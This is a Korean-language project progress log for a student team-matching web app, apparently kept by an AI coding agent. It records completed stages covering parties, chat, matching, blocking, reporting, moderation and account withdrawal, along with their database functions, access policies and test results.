# PROGRESS

## 현재 상태 (2026-10-04 기준)

- **완료:** 1단계(설계) + 설계 수정 3건, 2-A(뼈대+DB), 2-B(화면: 로그인/온보딩/활동 탐색·상세/관리자 CRUD·CSV 가져오기), 3단계(추천·북마크·파티), 3단계 보완(역할 슬롯/활동당 가입 규칙/파티 정보 수정), 4-A(팀 채팅 + 앱 내 알림), 4-B(빠른 매칭: 알고리즘·DB 함수·스케줄 워커·화면), 5단계 일부(매칭 로직 일치 검증 + 추가 시나리오 테스트), **5-A(차단·신고·관리자·계정 정지·활동 제보·회원 탈퇴) 전체 완료**, **5-B(최종 점검·문서 완성) 사실상 완료**(테스트 안정화·인수 조건 점검·보안 리뷰 겸 실제 취약점 수정·접근성/반응형·README/operations/data-sources 문서), **5-B 보안 마무리(EXECUTE 권한 전수 점검) 완료**, **6단계(링크 붙여넣기 활동 등록) 4/4 전체 완료** — 아래 "6단계: 링크 붙여넣기 활동 등록" 참조, **티처블 머신 연동 G1(공통 어휘와 전공) 완료**, **G2(추천 개편과 자격 분리) 완료** — 아래 "G1: 공통 어휘와 전공"·"G2: 추천 개편과 자격 분리" 참조. `docs/teachable-machine-integration.md`(구현 기준, 원 설계는 `docs/tm-design-guidelines-original.md`) 9장 작업 단위(G1~G4)를 따른다.
- **미착수(외부 설정 필요, 이 세션들이 손대지 못함):** `.env.example` 갱신 — 이 세션(들)의 파일 접근 권한이 `.env*` 경로를 전부 차단해(Read/Write/Bash/PowerShell 전부) 직접 수정할 수 없었다. 아래 "다음 명령" 절에 권장 내용을 그대로 적어뒀으니 사용자가 직접 반영해야 한다. 6단계에서 새로 필요해진 `CRON_SECRET`(정기 점검 엔드포인트 인증)도 같은 블록에 추가해 뒀다 — 운영 전환 전 외부 스케줄러(Vercel Cron 등) 등록도 함께 필요하다(README "활동 URL 가져오기 / 링크 정기 점검" 참조).
- 실행 방법·테스트 계정·접속 주소는 `README.md` 참조. 설계 배경은 `docs/architecture.md` 참조.

## 3단계 진행 상황

- **추천 계산 (커밋 `d9d60be`):** `src/lib/recommend.ts`에 architecture.md 7장 가중치 공식을 순수 함수로 구현(`app_settings.recommendation_weights` 사용). 비교 불가 항목은 "미상"으로 제외 후 재정규화하며, `duration_time_fit`은 활동에 비교 가능한 필드(주당 필요 시간 등)가 아직 없어 항상 미상 처리한다(아래 "알려진 제한" 참조). 유효 가중치 합이 임계값 미만이면 탐색(디스커버리) 카드로 전환하고 활동 유형별로 섞어 노출한다. 단위 테스트 9건(`tests/unit/recommend.test.ts`) 통과. 홈 "맞춤 추천"·활동 상세 "추천 근거" 플레이스홀더를 실제 값으로 교체했고, "숨기기"/"관심 없음"은 새 테이블 `activity_feedback`(RLS: 본인만)에 영구 저장된다.
- **북마크 (커밋 `8cae5c0`):** `bookmarks` 테이블은 2-A부터 있었으나 화면이 없었다. 활동 상세에 낙관적 업데이트 토글 버튼을 추가하고(`src/components/BookmarkButton.tsx` + 서버 액션 `toggleBookmark`), `/me`에 최근 북마크 5건을 표시한다.
- **파티 DB 함수 (커밋 `8927f05`, 마이그레이션 `20261003140100`):** 생성/지원/취소/승인/거절/탈퇴/위임/해산/확정/재모집 10개를 SECURITY DEFINER 함수로 구현. `approve_application`은 `parties` 행을 `FOR UPDATE`로 잠가 마지막 자리 동시 승인을 직렬화하고, `confirm_party`는 멤버별로 `is_confirmed` 갱신을 시도해 `party_members_one_confirmed_per_activity` 유니크 위반(동일 활동 다른 파티에 이미 확정됨)을 개별적으로 잡아 그 멤버만 자동 제외(`removed`)한 뒤 승자의 다른 대기 지원을 `superseded`로 정리한다(둘 다 에러로 중단되지 않고 완료됨). `leave_party`는 팀장이 다른 멤버가 있으면 위임 없이 탈퇴를 거부한다. `app_settings.party_rate_limits`로 생성/지원 빈도를 제한하고, 모든 이벤트에서 `notifications`를 `dedupe_key` upsert로 적재한다. `parties`/`party_members`/`party_applications`의 INSERT/UPDATE RLS를 운영자 전용으로 좁혀 일반 사용자는 반드시 이 함수들을 거치도록 강제했다. 통합 테스트(`tests/rls/party_lifecycle.test.ts`, 실제 로그인 클라이언트 + `Promise.all` 동시 호출) 4건 통과 — 아래 "실제 실행한 검증과 결과" 참조.
- **파티 화면 (커밋 `01d1c7c`):** `/parties`(내가 만든 파티 / 참여 중인 파티 / 지원 중), `/parties/new?activity=<id>`(생성 폼), `/parties/[id]`(멤버 목록, 팀장이면 지원 승인·거절, 상태·역할별 액션 패널: 지원하기/지원 취소/탈퇴/팀 확정/재모집/팀장 위임/해산). 활동 상세의 "관련 파티" 플레이스홀더를 실제 목록 + 만들기 링크로 교체했다. DB 함수 에러 메시지('CODE: 설명')에서 설명만 사용자에게 노출한다. E2E(`tests/e2e/party-flow.spec.ts`)로 student1 파티 생성 → student2 지원 → student1 승인 → 양쪽 `/parties` 반영을 실제 프로덕션 빌드 대상으로 검증했다. Playwright가 `.env.local`을 읽지 못하던 문제(vitest는 Vite가 자동 주입하지만 Playwright는 아님)를 `playwright.config.ts`에 `dotenv` 로딩을 추가해 고쳤다.

## 3단계 보완 (역할 슬롯 / 활동당 가입 규칙 / 파티 정보 수정)

3단계 완료 시점의 "알려진 제한" 2·3·4번(아래 참조)으로 남겨뒀던 범위를 마저 구현했다.

- **역할 슬롯 필수화(커밋 `6764f17`, `1be437d`, 마이그레이션 `20261003150000`):** `create_party`가 `p_role_slots`(역할명+인원 배열)와 `p_leader_role_name`을 받아 `party_role_slots`를 실제로 채운다. 팀장도 역할 하나를 차지하고, 역할별 인원의 합이 파티 전체 정원이 된다(기존 `p_capacity` 파라미터는 제거). `apply_to_party`는 `p_role_slot_id`를 필수로 받고, 이미 정원이 찬 역할은 (지원 시점 기준으로) 거부한다. `approve_application`은 지원서에 저장된 `role_slot_id`로 `party_role_slots` 행을 잠그고 그 역할의 실제 정원을 재검사한 뒤 멤버를 추가한다. `party_role_slots`의 INSERT/UPDATE/DELETE RLS도 운영자 전용으로 좁혀, 일반 사용자가 직접 테이블을 써서 이 검증을 우회할 수 없게 했다. 화면 쪽은 파티 생성 폼에 역할 입력 행(추가/삭제) + 팀장 역할 선택을 추가했고, 지원 화면은 빈 슬롯이 있는 역할만 고를 수 있게 제한했다. 파티 목록·상세에 "역할명 N/M · 역할명 N/M" 형식의 현황과(`formatRoleSlotSummary`), 모집 중일 때 부족한 역할 목록을 표시한다.
- **활동당 가입 규칙 변경(같은 마이그레이션):** 부분 UNIQUE 인덱스를 `WHERE is_confirmed = true`에서 `WHERE status = 'active'`로 바꿔, "같은 활동에서는 활성 멤버(승인된 멤버)가 한 파티에만 있을 수 있다"는 제약을 확정(confirm) 시점이 아니라 **승인(approve_application) 시점**에 강제하도록 앞당겼다. 승인되는 즉시 같은 활동의 다른 `pending` 지원은 자동으로 `superseded` 처리되고, 지원자가 이미 다른 파티의 활성 멤버라면 승인 자체가 `ALREADY_ACTIVE_IN_ACTIVITY`로 거부된다. 이 제약이 승인 시점에 이미 보장되므로 `confirm_party`는 더 이상 "동일 활동 다른 파티에 이미 확정됨" 충돌을 처리할 필요가 없어졌고, 기존의 멤버 자동 제외(`removed`) + `jsonb` 반환 로직을 제거해 단순화했다(반환 타입 `jsonb` → `void`). **동시성 설계:** 두 팀장이 같은 지원자를 동시에 승인하는 경쟁에서 서로 다른 행(지원서 A, 지원서 B)을 잠근 두 트랜잭션이 서로를 기다리며 교착하지 않도록, `lock_activity_membership(activity_id, profile_id)` advisory lock을 그 어떤 `FOR UPDATE` 행 잠금보다도 먼저 건다(`create_party`/`approve_application` 공통). `docs/architecture.md` 4장 핵심 불변식 1, 5.2절을 이 설계에 맞게 갱신했다.
- **파티 정보 수정(같은 마이그레이션 + 커밋 `1be437d`):** `update_party_details()` DB 함수(팀장 또는 운영자만, 종료된 파티는 거부)와 `/parties/[id]/edit` 화면을 추가했다. 제목(목표)·소개·모임 방식·모집 마감·공통 시간(자유 형식 텍스트 → `{"note": text}` jsonb)을 수정할 수 있고, 역할별 정원도 함께 조정할 수 있다(단, **현재 그 역할의 인원(`filled_count`)보다 적게 줄이는 것은 거부**). 전체 정원(`parties.capacity`)은 역할별 정원의 합으로 자동 재계산되며, 늘려서 `full` 상태였던 파티가 다시 `recruiting`으로 바뀌는 경우도 처리한다. **의도적으로 범위에서 뺀 것:** 역할 자체의 추가/삭제나 역할 이름 변경은 이번 수정 화면에 포함하지 않았다(기존 역할의 인원 조정만 지원) — 요청 범위("역할별 정원 조정" 뉘앙스)를 벗어나는 추가 복잡도(역할 삭제 시 이미 배정된 멤버 처리 등)를 피하기 위한 선택이며, 필요해지면 별도 작업으로 확장한다.
- **검증:** `tests/rls/party_lifecycle.test.ts`를 새 함수 시그니처·시나리오로 다시 작성했다(7건) — 같은 역할 마지막 슬롯 동시 승인 2건 중 1명만 성공, 같은 활동 두 파티 동시 승인 시 한 곳만 성공하고 나머지 지원은 `superseded`, 정원이 찬 역할 지원 거부, 팀장이 아닌 사용자의 승인·위임·수정 거부, 탈퇴 시 멤버십 즉시 상실, 역할 정원 축소/확대 규칙. `tests/rls/invariants.test.ts`의 기존 유니크 제약 테스트는 그대로 통과한다(활성 멤버 기준으로 바뀌어도 테스트가 쓰는 기본 `status='active'` 멤버에는 동일하게 적용되므로). E2E(`tests/e2e/party-flow.spec.ts`)를 역할 선택 포함 흐름으로 갱신했다. `/parties`, `/parties/new`, `/parties/[id]`, `/parties/[id]/edit`를 360px/1440px로 스크린샷 확인 — 가로 스크롤 없음, 역할 현황·부족한 역할 표시가 레이아웃 깨짐 없이 보임.

## 4-A단계 진행 상황 (팀 채팅 + 앱 내 알림)

빠른 매칭(4-B)은 이번 범위에서 건드리지 않았다. 설계 배경·근거는 `docs/architecture.md` 11장 참조.

- **채팅 DB·권한 (커밋 `2c33cfc`, 마이그레이션 `20261003160000`, `20261003161000`):** `send_chat_message`/`mark_chat_read`/`list_my_chat_rooms`/`mark_notification_read`/`mark_all_notifications_read` SECURITY DEFINER 함수를 추가하고, `chat_messages`/`chat_read_states`/`notifications`의 INSERT·UPDATE RLS를 운영자 전용으로 좁혀 일반 사용자는 반드시 이 함수들을 거치게 했다(기존 파티 함수와 동일한 패턴). 메시지는 `client_message_id` 기준으로 멱등 재시도되고(동시 재시도 3건을 보내도 1건만 저장 — `tests/rls/chat.test.ts`), 분당 전송 횟수를 `app_settings.chat_rate_limits`로 제한한다. 지원 승인/탈퇴/팀장 위임/팀 확정 시 기존 파티 함수(`approve_application`/`leave_party`/`delegate_leader`/`confirm_party`)가 시스템 메시지를 자동으로 남긴다. **Realtime은 처음 계획했던 "postgres_changes + private 채널"이 아니라 Broadcast-from-Database로 구현했다** — 로컬 스택에서 두 브라우저로 직접 검증하다가 `private` 채널 옵션이 Postgres Changes에는 적용되지 않는다는 사실(공식 문서)을 발견해 설계를 바꿨다. 상세 이유와 메커니즘은 `docs/architecture.md` 11.2절 참조.
- **채팅 화면 (커밋 `ac05fcc`):** `/chat`(내 채팅방 목록 — 파티 제목, 마지막 메시지 미리보기, 안 읽은 수 배지), `/chat/[roomId]`(메시지 목록 + 역할 포함 멤버 목록 + "팀을 나가도 과거 내역은 남는다" 안내). 하단 탭 "채팅"의 "준비 중" 빈 상태를 실제 화면으로 교체했고, 하단 탭에 안 읽은 메시지 수 배지를 추가했다(`src/lib/nav-badges.ts`가 루트 레이아웃에서 집계해 `BottomNav`에 내려준다). 메시지는 전송 중/실패/재시도 상태를 보여주고(`src/app/chat/[roomId]/ChatRoomClient.tsx`), 과거 내역은 커서 기반("이전 메시지 더 보기")으로 불러온다. 메시지 본문은 항상 일반 텍스트로 렌더링하고(`dangerouslySetInnerHTML` 미사용) `http(s)://` 링크만 클릭 가능하게 바꾼다(`src/lib/chat.ts`의 `splitMessageSegments`, 단위 테스트 포함). 채팅방이 (재)연결될 때마다 마지막으로 받은 메시지 이후를 따라잡는 보강 로직을 포함한다(Broadcast는 과거 이벤트를 재생하지 않으므로). 방을 여는 시점에 서버 컴포넌트에서 곧바로 `mark_chat_read`를 호출해(클라이언트 하트비트만 믿으면 읽자마자 바로 다른 화면으로 이동할 때 그 비동기 호출이 끝나기 전에 떠나버리는 경우가 있었다) 읽음 처리를 확정한다.
- **탈퇴/강퇴 접근 차단:** DB/RLS 레벨에서 조회·전송·Realtime 수신이 모두 막히고(`tests/rls/chat.test.ts`), 이미 열려 있던 연결은 15초 주기 하트비트가 멤버십을 재확인해 `NOT_A_MEMBER`를 받으면 클라이언트가 스스로 구독을 끊는다. 상세는 `docs/architecture.md` 11.4절.
- **앱 내 알림 (커밋 예정, 이 커밋):** `/notifications`(목록, 개별/모두 읽음 처리, 관련 파티·채팅으로 이동하는 링크), `/me`에 안 읽은 수 배지가 달린 "알림" 진입 링크 추가, 하단 탭 "마이"에도 같은 배지를 표시한다(`nav-badges.ts`를 `getNavBadgeCounts()`로 확장). 새 채팅 알림은 메시지마다 쌓지 않고 `dedupe_key = 'chat_new_message:' + chat_room_id`로 방 단위로 묶이며(4-A 1/3에서 이미 구현), 채팅방을 보고 있는 동안은 생성되지 않는다(근사 구현, 11.3절 참조). 북마크 활동 마감 임박 알림은 스케줄 워커가 필요해 4-B로 미룬다(요청 범위 그대로).
- **검증:** 통합 테스트 — `tests/rls/chat.test.ts`(6건: 승인 즉시 조회/전송 가능 + 합류 시스템 메시지, 다른 팀 멤버의 조회/전송 거부(직접 테이블 INSERT 우회 시도 포함), 탈퇴 직후 조회/전송/읽음처리 거부, 동시 재전송 시 1건만 저장, 빈 메시지·길이 초과 거부, 팀장 위임·팀 확정 시스템 메시지), `tests/rls/notifications.test.ts`(3건: 본인 알림만 읽음 처리 가능, `mark_all_notifications_read`가 본인 것만 처리, 직접 UPDATE 거부). E2E(`tests/e2e/chat-flow.spec.ts`, 독립 브라우저 컨텍스트 2개) — student1↔student2 실시간 송수신 → 새로고침 후 내역 복구 → 안 읽은 수 증가/소멸 → student2 탈퇴 후 메시지 미수신(재방문 시 접근 거부로 확인). `/chat`, `/chat/[roomId]`, `/notifications`, `/me`를 360px/1440px로 스크린샷 확인 — 가로 스크롤 없음, 링크 렌더링·배지·멤버 요약·알림 목록이 레이아웃 깨짐 없이 표시됨.

## 4-B단계 진행 상황 (빠른 매칭)

지시서 7장 B를 그대로 따랐다. 설계·알고리즘·워커 상세는 `docs/architecture.md` 12장, Realtime 한계 재검토는 `docs/operations.md` 참조.

- **알고리즘 (커밋 `ec60cc4`):** `src/lib/matching.ts`의 `findMatch()` — 역할 슬롯 충족, 전체 공통 시간 교집합(요일 단위 투 포인터 스윕), 차단 관계 상호 제외, 팀장 동의자 1명 이상 필수, 대기 시각 우선 + queueId 결정적 동점 규칙을 반영한 탐욕 + 제한된 백트래킹(재귀 없는 반복적 스택). 최적해를 보장하지 않고 `maxBacktrackSteps`를 넘기면 포기한다. 단위 테스트 10건(역할 충족/부족, 전체 교집합 계산, "겹침의 함정"(모든 쌍은 겹치지만 셋이 동시에 겹치는 시간은 없음 — A-B는 월요일, B-C는 화요일, A-C는 수요일에만 겹치게 구성), 팀장 동의자 없음, 차단 관계로 대안 선택/실패, 동점 시 결정적 선택, 탐색 한도 초과 시 null).
- **DB 함수·워커 (커밋 `fef5354`, 마이그레이션 `20261003170000`/`20261003170100`):** 활동별 역할 구성 템플릿(`activity_match_templates`/`_roles`, `party_role_slots`와 같은 모양) 추가. `matching_queue`를 단일 `template_role`에서 `template_id` + `eligible_roles`(복수 선택) 구조로 교체. 사용자 함수 `join_matching_queue`(가능 시간 미설정 시 거부)/`cancel_matching_queue`/`respond_to_match_proposal`, 워커 `run_match_worker(p_as_of)`(pg_cron이 매분 호출 — 로컬 스택에서 실제로 동작 확인)가 만료 처리 → 매칭 편성 → 북마크 마감임박 알림 순으로 실행한다. 매칭 편성(`_find_match_for_group`)은 `src/lib/matching.ts`와 같은 설계를 plpgsql로 독립 재구현했다(pg_cron이 Node를 호출 못 하므로). 전체 공통 시간은 요일을 "주간 분 오프셋"으로 매핑한 `int4multirange` 교집합 연산자로 계산. 동시성은 후보 수집 `FOR UPDATE SKIP LOCKED` + 파티 생성 행 잠금·`party_id` 멱등 가드로 보장. 교차 정리: 매칭 대기/제안 중 수동 파티에 합류하면 대기열·제안을 정리하고, 반대로 매칭이 확정되면 수동 파티 대기 지원을 `superseded` 처리. `npm run worker:match`(`scripts/run-match-worker.mjs`)로 수동 실행 가능. 시드에 "역할·시간이 맞아 student1이 참가하면 바로 제안이 생기는 활동"과 "시간이 안 맞아 계속 대기만 하는 활동"을 기존 availability_slots 데이터를 재사용해 추가. 통합 테스트 6건(`tests/rls/matching.test.ts`): 매칭 성공→전원 수락→파티·채팅방 1회 생성, 마지막 동시 수락 시 파티 1개, 워커 동시 실행 시 중복 없음, 거절 시 제안 해제+계속 찾기 동의자만 재대기, 기한 만료 처리, 수동 파티 합류 시 대기열 정리.
- **화면 (커밋 `d4c5df7`):** `/match/[activityId]`가 참가 전(템플릿·복수 역할 선택·팀장/계속찾기 동의·참여 동의 폼) / 대기 중(대기 인원·부족한 역할·취소·수동 파티 대안) / 제안 받음(팀 구성·역할·팀장 후보·"주당 약 N시간"으로 최소 공개한 공통 시간·수락 기한·수락/거절) 세 상태를 전환해 보여준다. 가능한 시간이 없으면 참가를 막고 `/me/edit`로 안내. 활동 상세의 "4단계에서 제공 예정" 안내를 실제 진입 버튼으로 교체. 관리자 활동 수정 화면에 템플릿 관리 섹션 추가(활성화/비활성화/삭제). `/me`의 매칭 이력 플레이스홀더를 실제 목록으로 교체.
- **검증 (이 커밋):** E2E(`tests/e2e/match-flow.spec.ts`) — 대기열 참가(UI) → 워커 실행 → 양쪽에 제안 표시 → 전원 수락 → 파티/채팅방 생성 → 실제 채팅까지 end-to-end 확인. `/match` 참가·대기·제안 화면과 관리자 템플릿 관리 화면을 360px/1440px로 스크린샷 확인. `docs/architecture.md` 12장에 알고리즘·워커·상태 전이를 실제 구현 기준으로 정리하고, `docs/operations.md`를 신설해 "탈퇴 후 이미 열린 Realtime 연결" 한계를 재검토·기록(아래 "알려진 제한" 11번 참조).

## 5단계 진행 상황 (운영·검증, 진행 중)

지시서 5단계(운영·검증)를 시작하면서, 4-B 완료 시점에 "두 구현(TS `findMatch()` / plpgsql `_find_match_for_group()`)이 갈라질 위험"으로 남겨둔 트레이드오프(`docs/architecture.md` 12.2절)를 먼저 실제로 검증했다.

- **매칭 로직 일치 검증 (`tests/rls/matching_consistency.test.ts`, 3건):** 같은 입력 픽스처를 TS `findMatch()`와 실제 DB 워커(`run_match_worker` → `_find_match_for_group`) 양쪽에 동일하게 넣어 결론을 직접 비교한다. DB 쪽은 테스트 동안 student1/2/3의 `availability_slots`를 픽스처 값으로 치환(isolate)했다가 종료 후 원복한다. 3가지 시나리오(역할 충족 성공, "겹침의 함정"(모든 쌍은 겹치지만 셋이 동시에 겹치는 시간은 없음), 차단 관계로 대안 선택) 모두 두 구현이 같은 결론(매칭 성공 여부·팀장·팀 구성·공통 시간)을 냈다.
- **DB 워커 추가 시나리오 (`tests/rls/matching_scenarios.test.ts`, 6건):** 기존 `tests/rls/matching.test.ts`가 다루지 않던 경로를 보강 — 겹침의 함정, 차단 관계 상호 제외, 팀장 동의자 없음, 역할 부족(헤드카운트는 충분하나 특정 역할을 채울 사람이 없음), 대기 시간 우선, 동점 시 queue id 결정적 선택.
- **검증:** `npm test` **100/100 통과**(기존 91건 + 신규 9건). `npm run lint`/`npm run typecheck`/`npm run build` 모두 성공. 작업 중 `admin`(service_role) 클라이언트로 테스트용 활동을 생성·삭제하는 cleanup 패턴이 실제로 삭제까지 커밋되는지 별도 스크립트로 직접 확인(의심했던 버그 없음 — 정상 동작 확인 후 스크립트는 제거).

## 5-A단계: 차단 (완료)

`blocks` 테이블과 그 RLS(본인만 생성/해제, 운영자는 조회 가능)는 2단계(기반)에서부터 이미 있었지만 화면과 실제 연동 로직이 없었다. 자동 매칭 제외도 4-B에서 `_blocked()`로 이미 구현돼 있었다. 이번에 나머지(파티 지원·채팅 알림·관련 파티 목록·화면)를 연결했다.

- **지원 거부 (마이그레이션 `20261004010000`):** `apply_to_party`가 지원하려는 파티의 활성 멤버(팀장 포함) 중 차단 관계가 있는 사람이 있으면 `BLOCKED_MEMBER`로 거부한다.
- **알림 억제 (같은 마이그레이션):** `send_chat_message`가 방 단위 "새 메시지" 알림을 만들 때, 발신자를 차단했거나(또는 반대로) 발신자가 차단한 수신자는 제외한다. 메시지 자체는 여전히 저장·전달된다 — **이미 같은 팀이면 차단만으로 강퇴하지 않는다**(지시서 8장 요구사항 그대로).
- **메시지 숨김 (앱 레이어):** `ChatRoomClient`가 차단한 상대의 메시지를 화면에서만 숨긴다(서버에는 그대로 남고, 시스템 메시지는 항상 보인다). 초기 로드·실시간 브로드캐스트·"놓친 메시지 따라잡기" 세 경로 모두 같은 `mergeMessages`를 거치므로 한 곳에서 필터링된다.
- **새 파티 추천 제외 (앱 레이어, `src/lib/blocks.ts`):** 활동 상세의 "관련 파티" 목록에서 활성 멤버 중 차단 관계가 있는 파티를 제외한다(`filterPartiesExcludingBlocked`, 순수 함수 + 단위 테스트).
- **화면:** `/me/blocked`(차단 목록 + 해제), `/chat/[roomId]`와 `/parties/[id]`의 멤버 목록에 "차단하기/차단 해제" 버튼 추가(`BlockToggleButton`, `BookmarkButton`과 같은 낙관적 토글 패턴). 이 앱에는 별도의 "다른 사용자 프로필" 화면이 없어(알려진 제한 8번 참조) 채팅·파티 멤버 목록을 차단의 진입점으로 삼았다 — 의도적으로 범위를 좁힌 선택.
- **검증:** 단위 테스트(`tests/unit/blocks.test.ts`, 7건) + 통합 테스트(`tests/rls/blocking.test.ts`, 3건: 차단된 멤버가 있으면 지원 거부/차단 없으면 정상 지원/차단한 수신자에게 알림 미생성 + 멤버십은 유지됨 확인). `npm test` **110/110 통과**, `lint`/`typecheck`/`build` 모두 성공.
- **작업 중 발견하고 고친 문제:** `seed.sql`에 데모용으로 넣어둔 student1↔student3 고정 차단 관계가, `apply_to_party`가 차단을 검사하게 된 뒤로 그 관계와 전혀 무관한 다른 테스트(`party_lifecycle.test.ts`, `matching.test.ts`)에서 두 사용자가 우연히 팀장/지원자로 짝지어질 때 뜻밖의 `BLOCKED_MEMBER` 거부를 유발했다. 데모 차단 시드를 제거하고, 그 관계가 실제로 필요한 두 테스트(`matching_consistency.test.ts`, `matching_scenarios.test.ts`의 "차단 관계" 케이스)는 각자 테스트 안에서 차단을 만들고 `afterEach`에서 정리하도록 바꿔 공유 테스트 계정 간의 숨은 결합을 없앴다. 같은 세션에서 `tests/rls/matching.test.ts`의 `expect(result.new_proposals).toBe(1)`가 `run_match_worker`의 전역 카운트를 직접 비교해 pg_cron 백그라운드 틱과 경합하는 pre-existing flaky 단언이었음을 발견해, 이미 바로 다음 줄에 있던 `activity_id` 스코프 검증(다른 모든 매칭 테스트 파일이 쓰는 패턴)만 남기고 제거했다.

## 5-A단계: 신고·관리자·계정 정지·활동 제보 (완료)

`reports`/`audit_logs` 테이블과 RLS는 **2단계(기반)에서 이미 만들어져 있었다**(`activities_select`의 `created_by = auth.uid()` 절, CSV 가져오기의 `status='draft'` 비공개 등록 패턴도 마찬가지) — 하지만 그 위에 DB 함수도 화면도 전혀 없었다. 마이그레이션 `20261004020000`에서 한 번에 연결했다.

- **신고 (`create_report`):** 사유(스팸/욕설·혐오/부적절/사기/기타 5종 — `reports.reason`에 CHECK 추가) + 설명(`description` 컬럼 신설) 입력, 시간당 5건 빈도 제한(`app_settings.report_rate_limits`), 자기 자신(profile) 신고 금지. `reports` INSERT RLS를 운영자 전용으로 좁혀(기존 "본인만" 정책을 대체) 일반 사용자는 이 함수를 반드시 거치게 했다 — 파티/채팅 함수와 같은 패턴. UI: `ReportButton`(사유 선택 + 설명 인라인 폼)을 파티 멤버·파티 자체·채팅 멤버·채팅 메시지 네 곳에 붙였다.
- **신고 처리 (`update_report_status`):** 운영자만 접수/검토 중/조치/기각으로 전환, 처리 메모를 감사 로그에 남긴다. `/admin/reports`에서 상태 변경 버튼으로 조작.
- **신고된 메시지 최소 범위 열람 (`get_reported_message_context`):** "일반적인 전체 채팅 열람 도구는 만들지 않는다"는 지시서 요구를 그대로 지켰다 — 신고된 메시지 **전후 3개씩만** 반환하고(방 전체를 돌려주지 않음), 운영자만 호출 가능하며, 조회 자체를 `view_reported_message_context`로 감사 로그에 남긴다. `/admin/reports`에서 `target_type='chat_message'`인 신고에만 "메시지 보기" 버튼이 뜬다.
- **계정 정지 (`suspend_account`/`unsuspend_account`):** `profiles.account_status`는 2단계부터 `suspended`/`withdrawn`을 지원했지만 아무것도 강제하지 않았다. **운영자 계정은 정지할 수 없다**(`is_admin_profile` 헬퍼로 안전장치). `/admin/accounts`에서 닉네임 검색 + 정지(사유 입력)/해제.
- **계정 정지 강제 — 테이블 레벨 트리거:** 기존 SECURITY DEFINER 함수 10여 개를 하나하나 고치는 대신, `parties`/`party_members`/`party_applications`/`chat_messages`/`matching_queue`/`match_proposal_members`에 공통 `BEFORE INSERT OR UPDATE` 트리거(`_enforce_active_account`)를 달아 "그 행을 쓰려는 실제 행위자(`auth.uid()`)"의 계정이 active가 아니면 거부한다. `auth.uid()`가 null(서비스 롤 — 워커/시드)이면 통과시킨다. 이렇게 하면 지원·메시지·매칭 참가·파티 생성·승인·위임·해산 등 그 테이블을 거치는 모든 현재·향후 쓰기 경로가 한 번에 보호된다 — 행위자 기준이므로, 예를 들어 팀장이 지원을 승인할 때는 "팀장"이 active인지를 검사한다(승인되는 지원자 본인이 아니라).
- **사용자 활동 제보 (`submit_activity`) + 운영자 승인/거절:** 별도 테이블을 새로 만들지 않고 `activities`를 재사용했다 — 2단계가 이미 "사용자 제보" 가능성을 염두에 둔 흔적(RLS의 `created_by` 절)이 있었다. 제보는 `status='draft'`로 비공개 생성되고(하루 5건 제한), `/admin/submissions`가 **모든 draft 활동**(운영자 자신의 미완성 초안 포함 — 의도적으로 구분하지 않음, 운영자도 같은 화면에서 바로 공개 전환할 수 있어 유용하다)을 보여준다. 승인(`approve_activity_submission`)은 `published`로 전환 + 제보자 알림, 거절(`reject_activity_submission`)은 `archived`로 전환 + 사유를 담은 알림.
- **감사 로그:** `_log_audit_action()` 내부 헬퍼로 신고 상태 변경/신고 메시지 열람/계정 정지·해제/제보 승인·거절을 모두 기록한다. `/admin/audit-logs`가 실행자·행동·대상·메타데이터를 보여준다.
- **검증:** 통합 테스트(`tests/rls/reports_and_moderation.test.ts`, 11건) — 잘못된 사유/자기 신고 거부, 빈도 제한, 일반 사용자의 상태 변경·메시지 컨텍스트·계정 정지 거부(각각 `NOT_ADMIN`), 운영자 계정 정지 불가, **정지된 사용자의 파티 생성·매칭 참가 거부 + 해제 후 정상 동작 복구**, 일반 사용자의 `audit_logs` 조회 결과 0건(RLS), `user_roles` 자가 승격 불가, 제보→승인(공개 전환 + 알림)·제보→거절(보관 전환 + 사유 포함 알림) 왕복. E2E(`tests/e2e/report-moderation-flow.spec.ts`) — 파티 멤버 신고(UI) → 관리자 상태 변경(UI) → 감사 로그 반영까지 실제 화면으로 확인. `npm test` **121/121 통과**, `lint`/`typecheck`/`build`/전체 Playwright(7/7) 모두 성공. `/admin/reports`·`/admin/accounts`·`/admin/submissions`·`/admin/audit-logs`·`/me/blocked`·`/activities/submit`를 360px/1440px로 스크린샷 확인 — 가로 스크롤 없음.

## 5-A단계: 회원 탈퇴 (완료)

`profiles.account_status`는 2단계부터 `withdrawn`을 지원했지만 아무 로직도 없었다. `withdraw_account()`(마이그레이션 `20261004030000`) 하나로 정리한다.

- **프로필 비식별화:** 닉네임을 "탈퇴한 사용자"로 바꾼다(자기소개·포트폴리오 링크·참여 조건 등 선택 정보는 null, 전공·관심분야·기술·희망 활동 유형·가능 시간 행은 삭제). nickname을 조인해 보여주는 모든 화면(채팅 멤버 목록, 파티 멤버 목록, 채팅 시스템 메시지 "~님이 합류/탈퇴했어요")에 **별도 "작성자 표시" 로직 없이 자동 반영**된다 — `auth.users`/`profiles` 행 자체는 지우지 않는 소프트 탈퇴다(지우면 "탈퇴한 사용자"로 표시할 방법이 없어진다).
- **팀장 선안내:** 팀장으로 있는 파티에 다른 활성 멤버가 있으면 `LEADER_MUST_RESOLVE_PARTY_FIRST`로 탈퇴 자체를 막고 파티 이름을 알려준다. `/me/withdraw` 화면은 이 경우 탈퇴 폼 대신 "먼저 위임하거나 해산하라"는 안내와 해당 파티 링크를 보여준다(서버에서 RPC 에러를 받기 전에 미리 안내).
- **대기열·제안·지원 정리:** 진행 중인 매칭 제안은 `_release_match_proposal(..., 'cancelled')`로 빠지고(다른 멤버는 거절과 동일하게 `continue_on_fail`에 따라 재대기/취소), 본인의 매칭 대기열·대기 중인 파티 지원은 모두 취소한다. 남은 활성 파티 멤버십은 `leave_party`와 같은 규칙으로 정리한다(혼자 남은 팀장이면 파티 해산).
- **계정 정지와 같은 쓰기 차단 경로 재사용:** 탈퇴 후에는 5-A "관리자" 단계에서 만든 `_enforce_active_account` 트리거가 `account_status='withdrawn'`도 그대로 막아준다 — 추가 구현 없이 "탈퇴 후 쓰기 거부"가 이미 보장된다. 다만 **탈퇴 자체는 정지된 계정도 할 수 있어야 하므로**(탈퇴는 추가 권한이 아니라 자기 정리), `withdraw_account()` 내부에서만 그 트리거를 우회하는 트랜잭션 로컬 플래그(`app.withdrawing`)를 추가했다.
- **닉네임 유니크 제약 보강:** 2-B의 `profiles_nickname_key`(소문자 닉네임 유니크)가 전체 사용자 대상이라 둘째 탈퇴자부터 "탈퇴한 사용자" 닉네임 충돌이 날 뻔했다 — `where account_status <> 'withdrawn'` 부분 인덱스로 바꿔, 탈퇴 계정끼리는 닉네임이 겹쳐도 되게 했다(실제 서비스 식별자가 아니므로).
